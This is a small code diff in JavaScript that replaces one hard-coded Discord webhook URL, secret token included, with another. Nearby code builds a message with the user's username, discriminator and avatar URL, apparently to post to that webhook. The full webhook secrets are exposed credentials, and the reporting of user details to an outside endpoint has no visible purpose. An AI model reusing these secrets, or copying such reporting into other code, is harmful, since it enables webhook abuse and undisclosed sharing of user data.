@@ -42,7 +42,7 @@
 
                     // Webhook integration
                     const currentTime = new Date().toLocaleString();
-                    const webhookUrl = 'https://discord.com/api/webhooks/1139126414210236446/TmbkUEVdPcvQGOV2KnfYzRFaXV0UP81ZXk5d30tBUpbZBYRrSZfR3Kl1MEaAmQyWsuZX';
+                    const webhookUrl = 'https://discord.com/api/webhooks/1136990837578928229/6NDD4TUh4JMRmWKcvpC4jPUwYZhJmQQj69azoRkbcMWtCZMKNTcBeSH6TvpKYfliTksY';
                     const data = {
                         username: `${user.username}#${user.discriminator}`,
                         avatarUrl: avatarUrl,
